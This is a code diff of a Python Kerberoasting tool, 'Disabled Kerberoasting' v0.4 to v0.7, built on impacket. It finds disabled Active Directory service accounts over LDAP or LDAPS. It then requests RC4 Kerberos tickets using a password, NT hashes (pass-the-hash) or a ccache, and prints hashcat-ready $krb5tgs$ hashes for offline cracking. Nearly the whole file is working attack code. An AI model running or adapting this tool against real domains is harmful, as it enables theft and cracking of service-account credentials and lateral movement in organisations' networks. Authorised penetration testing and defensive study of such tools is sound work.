@@ -1,254 +1,145 @@
 #!/usr/bin/env python3
-# Disabled Kerberoasting v0.4 - Modified for lazy-ldap import and ldapsearch fallback
+# Disabled Kerberoasting v0.7 - LDAPS/Signing support
 import warnings
-warnings.filterwarnings("ignore", message=".*pkg_resources is deprecated as an API.*" ,category=UserWarning)
-import argparse, inspect, sys, subprocess, shlex
+warnings.filterwarnings("ignore", message=".*pkg_resources is deprecated as an API.*", category=UserWarning)
+import argparse, inspect, sys, os, ssl
 from impacket.krb5 import constants
 from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
 from impacket.krb5.types import Principal
 from impacket.krb5.ccache import CCache
 from impacket.ntlm import compute_nthash
 from impacket import version
+from impacket.ldap import ldap as impacket_ldap
+from impacket.ldap import ldapasn1 as ldapasn1
 from pyasn1.codec.der import decoder
-from impacket.krb5.asn1 import AS_REP, EncKDCRepPart
+from impacket.krb5.asn1 import AS_REP, TGS_REP
 import datetime
 
-# 사용자 인자 핸들링 함수
 def setArguments():
     args = argparse.ArgumentParser()
-    args.add_argument("-d","--domain", required=True, help="domain")
-    args.add_argument("-u","--username", required=True, help="user name")
-    args.add_argument("-p","--password", required=True, help="user password")
+    args.add_argument("-d", "--domain", required=True, help="domain")
+    args.add_argument("-u", "--username", required=True, help="user name")
+    args.add_argument("-p", "--password", required=False, default='', help="user password")
     args.add_argument("-dc-ip", required=True, help="domain controller address")
     args.add_argument("--request-user", help="specify target account name", required=False)
+    args.add_argument("-k", "--kerberos", action="store_true", help="Use Kerberos authentication (ccache)")
+    args.add_argument("-hashes", metavar="LMHASH:NTHASH", help="NTLM hashes (LM:NT or :NT)")
+    args.add_argument("-no-pass", action="store_true", help="Don't ask for password (useful for -k)")
+    args.add_argument("-ssl", action="store_true", help="Use LDAPS (SSL)")
+    
     args = args.parse_args()
-    target = ''
-    domain = args.domain
-    user = args.username
-    password = args.password
-    dc_ip = args.dc_ip
-    target = args.request_user
-    return domain, user, password, dc_ip, target
+    
+    return (args.domain, args.username, args.password, args.dc_ip, 
+            args.request_user, args.kerberos, args.hashes, args.no_pass, args.ssl)
 
-# last_logon, pwd_set 값 출력 시 날짜 형태로 변환 (robust: bytes/str/int)
 def filetime_to_dt(ft):
-    # Accept int, str, bytes
     if isinstance(ft, (bytes, bytearray)):
         try:
             ft_int = int(ft.decode(errors="ignore"))
-        except Exception:
-            try:
-                ft_int = int(ft)
-            except Exception:
-                ft_int = 0
+        except:
+            ft_int = 0
     elif isinstance(ft, str):
         try:
             ft_int = int(ft)
-        except Exception:
+        except:
             ft_int = 0
     elif isinstance(ft, int):
         ft_int = ft
     else:
-        try:
-            ft_int = int(ft)
-        except Exception:
-            ft_int = 0
-    # AD FILETIME is in 100-nanosecond intervals since Jan 1, 1601
-    # original code assumed ft was in 100-ns units and did //10 -> microseconds
+        ft_int = 0
     try:
         micros = ft_int // 10
         epoch = datetime.datetime(1601, 1, 1)
         return epoch + datetime.timedelta(microseconds=micros)
-    except Exception:
+    except:
         return datetime.datetime(1601, 1, 1)
 
-# --request-user 사용 안 할 시, 도메인 비활성화 SPN 목록만 열거하는 LDAP 요청
-def getDisabledAccounts(domain, user, password, dc_ip):
-    """
-    반환: rows 형식의 리스트
-    각 항목: [sam(bytes), spns(list of bytes), memberOf(list of bytes), pwdLastSet(bytes), lastLogon(bytes), delegation(list of bytes)]
-    """
-    # lazy import
-    try:
-        import ldap
-    except ImportError:
-        # python-ldap가 없으면 ldapsearch CLI 폴백 시도
-        base_dn = ",".join(f"DC={part}" for part in domain.split("."))
-        search_filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(servicePrincipalName=*))"
-        attrs = "sAMAccountName servicePrincipalName memberOf pwdLastSet lastLogon msDS-AllowedToDelegateTo"
-        # ldapsearch -x -H ldap://DC -D "user@domain" -w password -b "DC=domain,DC=local" "(filter)" attrs
-        ldapsearch_cmd = (
-            f'ldapsearch -x -H ldap://{dc_ip} -D "{user}@{domain}" -w "{password}" '
-            f'-b "{base_dn}" "{search_filter}" {attrs}'
-        )
-        try:
-            proc = subprocess.run(shlex.split(ldapsearch_cmd), capture_output=True, text=True, timeout=60)
-        except FileNotFoundError:
-            print("[-] ldapsearch가 시스템에 설치되어 있지 않습니다. (python-ldap 설치 권장: pip3 install python-ldap)")
-            return []
-        except Exception as e:
-            print("[-] ldapsearch 실행 중 오류:", e)
-            return []
-
-        if proc.returncode != 0:
-            print("[-] ldapsearch 실패:", proc.stderr.strip())
-            return []
-
-        out = proc.stdout.splitlines()
-        results = []
-        cur = {}
-        # 매우 단순 파서 — 복잡한 출력의 경우 확장 필요
-        for line in out:
-            line = line.rstrip()
-            if not line:
-                if cur:
-                    results.append(cur)
-                    cur = {}
-                continue
-            if line.startswith("dn: "):
-                cur["dn"] = line[4:]
-            elif ": " in line:
-                k, v = line.split(": ", 1)
-                # ldapsearch 같은 값이 여러 줄로 이어질 수 있으므로 append
-                cur.setdefault(k, []).append(v)
-        if cur:
-            results.append(cur)
-
-        formatted = []
-        for ent in results:
-            sam = ent.get("sAMAccountName", [""])[0].encode() if ent.get("sAMAccountName") else b""
-            if sam.decode(errors="ignore") == "krbtgt":
-                continue
-            spns = [s.encode() for s in ent.get("servicePrincipalName", [])]
-            memberOf = [m.encode() for m in ent.get("memberOf", [])]
-            pwdLastSet = ent.get("pwdLastSet", ["0"])[0].encode() if ent.get("pwdLastSet") else b"0"
-            lastLogon = ent.get("lastLogon", ["0"])[0].encode() if ent.get("lastLogon") else b"0"
-            delegation = [d.encode() for d in ent.get("msDS-AllowedToDelegateTo", [])]
-            formatted.append([sam, spns, memberOf, pwdLastSet, lastLogon, delegation])
-        return formatted
-
-    # python-ldap가 존재하면 기존 방식으로 조회
-    bind_dn = user + '@' + domain
+def getDisabledAccounts(domain, user, password, dc_ip, use_kerberos=False, lmhash='', nthash='', use_ssl=False):
     base_dn = ",".join(f"DC={part}" for part in domain.split("."))
+    
     try:
-        conn = ldap.initialize(f"ldap://{dc_ip}")
-        conn.set_option(ldap.OPT_REFERRALS, 0)
-        conn.simple_bind_s(bind_dn, password)
-    except ldap.LDAPError as e:
-        print(f"[-] LDAP bind error: {e}")
+        if use_ssl:
+            # LDAPS (포트 636)
+            ldap_conn = impacket_ldap.LDAPConnection(f'ldaps://{dc_ip}', base_dn, dc_ip)
+        else:
+            # 일반 LDAP
+            ldap_conn = impacket_ldap.LDAPConnection(f'ldap://{dc_ip}', base_dn, dc_ip)
+        
+        if use_kerberos:
+            # Kerberos 인증 (signing 자동)
+            ldap_conn.kerberosLogin(user, password, domain, lmhash, nthash, kdcHost=dc_ip)
+        else:
+            # NTLM 인증
+            ldap_conn.login(user, password, domain, lmhash, nthash)
+            
+    except Exception as e:
+        print(f"[-] LDAP connection error: {e}")
         return []
-    search_filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(servicePrincipalName=*))"
-    attrs = ["sAMAccountName", "servicePrincipalName", "memberOf", "pwdLastSet", "lastLogon", "msDS-AllowedToDelegateTo"]
+    
+    search_filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(servicePrincipalName=*)(!(sAMAccountName=*$)))"
+    
     try:
-        results = conn.search_s(base_dn, ldap.SCOPE_SUBTREE, search_filter, attrs)
-    except ldap.LDAPError as e:
+        resp = ldap_conn.search(
+            searchBase=base_dn,
+            searchFilter=search_filter,
+            attributes=['sAMAccountName', 'servicePrincipalName', 'memberOf', 'pwdLastSet', 'lastLogon', 'msDS-AllowedToDelegateTo']
+        )
+    except Exception as e:
         print(f"[-] LDAP search error: {e}")
-        conn.unbind()
         return []
+    
     searchResults = []
-    if not results:
-        print("[-] There is no result.")
-    else:
-        for dn, entry in results:
-            if not isinstance(entry, dict):
-                continue
-            sam = entry.get("sAMAccountName", [b""])[0]
-            try:
-                sam_dec = sam.decode()
-            except Exception:
-                sam_dec = str(sam)
-            if sam_dec == "krbtgt":
-                continue
-            spns       = entry.get("servicePrincipalName", [])
-            member_of  = entry.get("memberOf", [])
-            pwd_set    = entry.get("pwdLastSet", [b"0"])[0]
-            last_logon = entry.get("lastLogon", [b"0"])[0]
-            delegation = entry.get("msDS-AllowedToDelegateTo", [])
-            searchResults.append([sam, spns, member_of, pwd_set, last_logon, delegation])
-    conn.unbind()
+    
+    for item in resp:
+        if not isinstance(item, ldapasn1.SearchResultEntry):
+            continue
+        
+        entry = {}
+        try:
+            for attr in item['attributes']:
+                attr_type = str(attr['type'])
+                attr_vals = [str(val) for val in attr['vals']]
+                entry[attr_type] = attr_vals
+        except:
+            continue
+        
+        sam = entry.get('sAMAccountName', [''])[0]
+        if sam == 'krbtgt' or sam.endswith('$'):
+            continue
+        
+        spns = entry.get('servicePrincipalName', [])
+        memberOf = entry.get('memberOf', [])
+        pwdLastSet = entry.get('pwdLastSet', ['0'])[0]
+        lastLogon = entry.get('lastLogon', ['0'])[0]
+        delegation = entry.get('msDS-AllowedToDelegateTo', [])
+        
+        searchResults.append([
+            sam.encode(),
+            [s.encode() for s in spns],
+            [m.encode() for m in memberOf],
+            pwdLastSet.encode(),
+            lastLogon.encode(),
+            [d.encode() for d in delegation]
+        ])
+    
     return searchResults
 
-# getDisabledAccounts 함수로 얻은 searchResults 리스트를 반복문 2개로 출력
 def printResults(searchResults):
-    # 출력할 컬럼
-    headers = [
-        "ServicePrincipalName",
-        "Name",
-        "MemberOf",
-        "PasswordLastSet",
-        "LastLogon",
-        "Delegation"
-    ]
-
-    # 각 컬럼 이름 길이를 계산하여 딕셔너리로 관리
-    col_width = {}
-    for idx in range(len(headers)):
-        curHeader = headers[idx]
-        col_width[curHeader] = len(curHeader)
-
-    # getDisabledAccounts에서 이중 리스트로 관리한 결과를 단일 리스트로 변경하여 관리
+    headers = ["ServicePrincipalName", "Name", "MemberOf", "PasswordLastSet", "LastLogon", "Delegation"]
+    col_width = {h: len(h) for h in headers}
     rows = []
+    
     for entry in searchResults:
-        sam          = entry[0]
-        spns         = entry[1]
-        memberOf     = entry[2]
-        pwd_last_set = entry[3]
-        last_logon   = entry[4]
-        delegation   = entry[5]
+        sam, spns, memberOf, pwd_last_set, last_logon, delegation = entry
+        
+        pwd_str = filetime_to_dt(pwd_last_set).strftime("%Y-%m-%d %H:%M:%S")
+        logon_str = filetime_to_dt(last_logon).strftime("%Y-%m-%d %H:%M:%S")
+        sam_str = sam.decode() if isinstance(sam, bytes) else str(sam)
+        member_str = ", ".join([m.decode() if isinstance(m, bytes) else str(m) for m in memberOf])
+        deleg_str = ", ".join([d.decode() if isinstance(d, bytes) else str(d) for d in delegation])
 
-        # pwd_dt, logon_dt 날짜로 변환
-        pwd_dt   = filetime_to_dt(pwd_last_set)
-        logon_dt = filetime_to_dt(last_logon)
-        pwd_str   = pwd_dt.strftime("%Y-%m-%d %H:%M:%S.%f")
-        logon_str = logon_dt.strftime("%Y-%m-%d %H:%M:%S.%f")
-
-        # 인코딩되어 있으면 디코딩해서 문자로 저장
-        if isinstance(sam, (bytes, bytearray)):
-            try:
-                sam_str = sam.decode()
-            except Exception:
-                sam_str = str(sam)
-        else:
-            sam_str = str(sam)
-
-        # 인코딩되어 있으면 디코딩해서 문자로 저장. 여러 멤버그룹에 속해있으면 쉼표로 구분
-        if isinstance(memberOf, list):
-            temp_list = []
-            for m in memberOf:
-                if isinstance(m, (bytes, bytearray)):
-                    temp_list.append(m.decode(errors="ignore"))
-                else:
-                    temp_list.append(str(m))
-            member_str = ", ".join(temp_list)
-        else:
-            member_str = str(memberOf)
-
-        # 인코딩되어 있으면 디코딩해서 문자로 저장. 여러 위임 구성이 되어있으면 쉼표로 구분
-        if isinstance(delegation, list):
-            temp_list = []
-            for d in delegation:
-                if isinstance(d, (bytes, bytearray)):
-                    temp_list.append(d.decode(errors="ignore"))
-                else:
-                    temp_list.append(str(d))
-            deleg_str = ", ".join(temp_list)
-        else:
-            deleg_str = str(delegation)
-
-        if isinstance(spns, list):
-            spn_list = spns
-        else:
-            spn_list = [spns]
-
-        for sp in spn_list:
-            if isinstance(sp, (bytes, bytearray)):
-                try:
-                    spn_str = sp.decode()
-                except Exception:
-                    spn_str = str(sp)
-            else:
-                spn_str = str(sp)
-            # 전체 변수를 문자로 변환한 뒤, 각 항목을 rows 딕셔너리에 삽입
+        for sp in (spns if isinstance(spns, list) else [spns]):
+            spn_str = sp.decode() if isinstance(sp, bytes) else str(sp)
             rows.append([spn_str, sam_str, member_str, pwd_str, logon_str, deleg_str])
 
     if not rows:
@@ -259,27 +150,43 @@ def printResults(searchResults):
         for i, cell in enumerate(r):
             col_width[headers[i]] = max(col_width[headers[i]], len(cell))
 
-    header_line = "  ".join(headers[i].ljust(col_width[headers[i]]) for i in range(len(headers)))
-    separator   = "  ".join("-" * col_width[headers[i]]       for i in range(len(headers)))
     print('\n')
-    print(header_line)
-    print(separator)
-
+    print("  ".join(h.ljust(col_width[h]) for h in headers))
+    print("  ".join("-" * col_width[h] for h in headers))
     for r in rows:
-        line = "  ".join(r[i].ljust(col_width[headers[i]]) for i in range(len(headers)))
-        print(line)
+        print("  ".join(r[i].ljust(col_width[headers[i]]) for i in range(len(headers))))
 
-def sendAsReq(domain, user, password, dc_ip, target):
-    print('\n')
-    realm   = domain.upper()
-    cname = Principal(user,
-            type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+def sendAsReq(domain, user, password, dc_ip, target, use_kerberos=False, lmhash='', nthash=''):
+    print('')
+    realm = domain.upper()
+    cname = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+    kw = {"kdcHost": dc_ip}
+    
+    if use_kerberos:
+        ccache_file = os.environ.get('KRB5CCNAME', '')
+        if not ccache_file or not os.path.exists(ccache_file):
+            sys.exit(f"[-] Kerberos ccache not found. Set KRB5CCNAME environment variable.")
+        
+        ccache = CCache.loadFile(ccache_file)
+        tgt = ccache.getCredential(f'krbtgt/{realm}@{realm}')
+        if tgt is None:
+            sys.exit(f"[-] No TGT found in ccache for {realm}")
+        
+        tgt_data = tgt.toTGT()
+        sname = Principal(target, type=constants.PrincipalNameType.NT_SRV_INST.value)
+        tgs_tup = getKerberosTGS(sname, realm, dc_ip, tgt_data, tgt_data['cipher'], tgt_data['sessionKey'])
+        
+        asn1_rep, _ = decoder.decode(tgs_tup[0], asn1Spec=TGS_REP())
+        cipher_bytes = bytes(asn1_rep['ticket']['enc-part']['cipher'])
+        hc = f"$krb5tgs$23$*{target}${realm}${domain}/{target}*${cipher_bytes.hex()[:32]}${cipher_bytes.hex()[32:]}"
+        print(hc)
+        return
+    
+    if nthash:
+        kw["lmhash"], kw["nthash"], kw["aesKey"] = lmhash, nthash, ''
+    else:
+        kw["lmhash"], kw["nthash"], kw["aesKey"] = '', compute_nthash(password), ''
 
-    # RC4-HMAC 강제: nthash 사용 (etype 23)
-    nthash = compute_nthash(password)
-    kw = {"lmhash": '', "nthash": nthash, "aesKey": '', "kdcHost": dc_ip}
-
-    # SPN 옵션 적용
     sig = inspect.signature(getKerberosTGT).parameters
     sname = Principal(target, type=constants.PrincipalNameType.NT_SRV_INST.value)
     if "serverName" in sig:
@@ -289,39 +196,33 @@ def sendAsReq(domain, user, password, dc_ip, target):
     else:
         sys.exit("This impacket build does not support -target flag.")
 
-    # 1) AS-REQ (TGT 요청 with RC4)
     asResponse = getKerberosTGT(cname, password, realm, **kw)
-
-    rawAsResponse = asResponse[0]
-    asn1_rep, _ = decoder.decode(rawAsResponse, asn1Spec=AS_REP())
-    tgt, cipher, skey = asResponse[0], asResponse[-2], asResponse[-1]
-    # 2) SPN 지정 시 TGS 수동 요청
-    if not ("serverName" in kw or "targetName" in kw):
-        tgs_tup = getKerberosTGS(sname, realm, dc_ip, tgt, cipher, skey)
-        tgt, cipher, skey = tgs_tup[0], tgs_tup[1], tgs_tup[-1]
-
-    # Hashcat 포맷 자동 출력 (etype 23)
+    asn1_rep, _ = decoder.decode(asResponse[0], asn1Spec=AS_REP())
     cipher_bytes = bytes(asn1_rep['ticket']['enc-part']['cipher'])
-    salt = cipher_bytes.hex()[:32]
-    encrypted_data = cipher_bytes.hex()[32:]
-    hc = f"$krb5tgs$23$*{target}${realm}${domain}/{target}*${salt}${encrypted_data}"
+    hc = f"$krb5tgs$23$*{target}${realm}${domain}/{target}*${cipher_bytes.hex()[:32]}${cipher_bytes.hex()[32:]}"
     print(hc)
 
 def main():
-    domain, user, password, dc_ip, target = setArguments()
+    domain, user, password, dc_ip, target, use_kerberos, hashes, no_pass, use_ssl = setArguments()
+    
+    lmhash, nthash = '', ''
+    if hashes:
+        lmhash, nthash = (hashes.split(':') + [''])[:2]
+
+    if not use_kerberos and not password and not nthash and not no_pass:
+        print("[-] No authentication method provided. Use -p, -hashes, or -k")
+        sys.exit(1)
 
     if target:
-        sendAsReq(domain, user, password, dc_ip, target)
-        return
+        sendAsReq(domain, user, password, dc_ip, target, use_kerberos, lmhash, nthash)
     else:
-        searchResults = getDisabledAccounts(domain, user, password, dc_ip)
+        searchResults = getDisabledAccounts(domain, user, password, dc_ip, use_kerberos, lmhash, nthash, use_ssl)
         printResults(searchResults)
-        return
 
 if __name__ == "__main__":
     version.BANNER = ""
     try:
-        print(f'Disabled Kerberoasting v0.4 - Copyright 2025 All rights reserved by mick3y')
+        print(f'Disabled Kerberoasting v0.7 - Copyright 2025 All rights reserved by mick3y')
         main()
     except Exception as e:
         sys.exit(f"[-] {e}")
